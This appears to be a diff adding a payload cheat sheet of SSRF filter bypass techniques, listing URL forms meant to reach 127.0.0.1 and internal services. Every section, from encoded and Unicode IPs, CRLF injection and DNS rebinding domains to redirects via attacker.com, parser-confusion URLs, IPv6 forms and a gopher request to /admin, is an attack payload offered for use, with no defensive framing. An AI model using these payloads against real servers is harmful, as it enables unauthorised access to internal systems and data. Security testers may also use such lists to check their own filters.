@@ -1,0 +1,51 @@
+# SSRF Filter Bypass Techniques
+
+# ============ URL encoding ============
+http://127.0.0.1 -> http://%31%32%37%2e%30%2e%30%2e%31
+http://127.0.0.1 -> http://127%2e0%2e0%2e1
+
+# ============ Double URL encoding ============
+http://127.0.0.1 -> http://%25%33%31%25%33%32%25%33%37%2e%30%2e%30%2e%31
+
+# ============ Unicode/Punycode ============
+http://127.0.0.1 -> http://①②⑦.⓪.⓪.①
+http://127.0.0.1 -> http://⓵⓶⓻.⓪.⓪.⓵
+
+# ============ CRLF injection in URL ============
+http://attacker.com%0d%0aHost:%20127.0.0.1
+
+# ============ DNS rebinding ============
+# Use a domain that resolves to 127.0.0.1
+http://localtest.me
+http://spoofed.burpcollaborator.net
+http://127.0.0.1.nip.io
+http://127.0.0.1.xip.io
+http://www.oast.fun
+
+# ============ Redirect bypass ============
+# Host a redirect on your server to internal IP
+http://attacker.com/redirect?url=http://127.0.0.1
+
+# ============ URL parser confusion ============
+http://attacker.com@127.0.0.1
+http://127.0.0.1#@attacker.com
+http://127.0.0.1?@attacker.com
+http://attacker.com:80@127.0.0.1
+http://attacker.com\\@127.0.0.1
+
+# ============ IPv6 representations ============
+http://[::1]
+http://[0000:0000:0000:0000:0000:0000:0000:0001]
+http://[::ffff:127.0.0.1]
+http://[0:0:0:0:0:ffff:127.0.0.1]
+
+# ============ Mixed notation ============
+http://127.0.0.1.attacker.com
+http://attacker.com.127.0.0.1
+
+# ============ Protocol smuggling ============
+http://127.0.0.1:80%0d%0aCRLF-INJECTION
+gopher://127.0.0.1:80/_GET%20/admin
+
+# ============ Wildcards in DNS ============
+http://127.0.0.1.attacker.com (with wildcard DNS)
